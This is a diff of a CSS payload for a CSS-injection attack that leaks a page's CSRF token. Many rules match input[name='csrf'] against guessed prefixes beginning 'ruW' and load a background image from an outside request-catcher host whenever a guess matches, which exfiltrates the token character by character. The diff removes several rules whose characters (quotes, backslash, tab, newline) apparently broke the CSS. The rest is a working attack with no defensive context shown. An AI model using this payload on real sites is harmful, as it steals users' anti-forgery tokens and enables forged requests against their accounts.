@@ -251,10 +251,6 @@ input[name="csrf"][value^="ruW!"] {
   background-image: url("https://toto.requestcatcher.com/ruW!");
 }
 
-input[name="csrf"][value^="ruW""] {
-  background-image: url("https://toto.requestcatcher.com/ruW"");
-}
-
 input[name="csrf"][value^="ruW#"] {
   background-image: url("https://toto.requestcatcher.com/ruW#");
 }
@@ -339,10 +335,6 @@ input[name="csrf"][value^="ruW["] {
   background-image: url("https://toto.requestcatcher.com/ruW[");
 }
 
-input[name="csrf"][value^="ruW\"] {
-  background-image: url("https://toto.requestcatcher.com/ruW\");
-}
-
 input[name="csrf"][value^="ruW]"] {
   background-image: url("https://toto.requestcatcher.com/ruW]");
 }
@@ -377,26 +369,4 @@ input[name="csrf"][value^="ruW~"] {
 
 input[name="csrf"][value^="ruW "] {
   background-image: url("https://toto.requestcatcher.com/ruW ");
-}
-
-input[name="csrf"][value^="ruW	"] {
-  background-image: url("https://toto.requestcatcher.com/ruW	");
-}
-
-input[name="csrf"][value^="ruW
-"] {
-  background-image: url("https://toto.requestcatcher.com/ruW
-");
-}
-
-input[name="csrf"][value^="ruW"] {
-  background-image: url("https://toto.requestcatcher.com/ruW");
-}
-
-input[name="csrf"][value^="ruW"] {
-  background-image: url("https://toto.requestcatcher.com/ruW");
-}
-
-input[name="csrf"][value^="ruW"] {
-  background-image: url("https://toto.requestcatcher.com/ruW");
 }
